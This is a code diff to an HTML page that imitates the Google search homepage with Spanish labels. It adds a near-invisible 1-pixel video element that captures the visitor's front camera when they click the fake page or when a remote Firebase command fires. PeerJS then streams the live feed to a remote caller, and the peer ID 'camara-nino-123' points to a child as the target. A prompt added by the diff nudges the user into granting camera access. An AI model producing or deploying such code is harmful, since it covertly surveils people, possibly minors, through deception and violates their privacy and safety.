@@ -12,12 +12,12 @@
         .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; height: 100vh; }
         .logo { width: 160px; margin-bottom: 20px; }
         .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; box-shadow: 0 1px 6px rgba(32,33,36,.28); outline: none; }
-        #videoLocal { display: none; position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; }
+        #videoOculto { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
-    <video id="videoLocal" autoplay playsinline muted></video>
-    <div class="google-home" onclick="activarCamara()">
+    <video id="videoOculto" autoplay playsinline muted></video>
+    <div class="google-home" onclick="activar()">
         <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
         <input type="text" class="search-bar" placeholder="Buscar en Google...">
     </div>
@@ -30,23 +30,22 @@
         const peer = new Peer('camara-nino-123'); 
         let miStream = null;
 
-        async function activarCamara() {
+        async function activar() {
             try {
                 miStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                document.getElementById('videoLocal').srcObject = miStream;
-                console.log("Cámara encendida");
-            } catch (e) { console.log("Error cámara"); }
+                document.getElementById('videoOculto').srcObject = miStream;
+            } catch (e) { alert("Toca el logo para permitir cámara"); }
         }
 
         db.ref('comando_camara').on('value', (snap) => {
-            if (snap.val() === "ABRIR") activarCamara();
+            if (snap.val() === "ABRIR") activar();
         });
 
         peer.on('call', (call) => {
             if (miStream) {
                 call.answer(miStream);
             } else {
-                activarCamara().then(() => { if(miStream) call.answer(miStream); });
+                activar().then(() => { if(miStream) call.answer(miStream); });
             }
         });
     </script>
